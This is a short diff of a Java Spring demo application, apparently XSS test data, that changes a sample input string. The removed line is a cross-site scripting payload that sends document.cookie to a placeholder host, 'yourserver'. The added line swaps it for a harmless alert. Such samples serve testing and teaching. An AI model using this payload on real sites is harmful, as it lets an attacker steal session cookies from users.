@@ -42,7 +42,7 @@ public class DemoApplication {
 
     private String xssInputData = new String(
         "<p> <input type='button' name='Redirect' class='btn btn-primary' value='Submit' "
-            + "onclick='<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>' /></p>");
+            + "onclick='alert(document.cookie);'/></p>");
 
     @RequestMapping("/user")
     public Principal user(Principal user) {
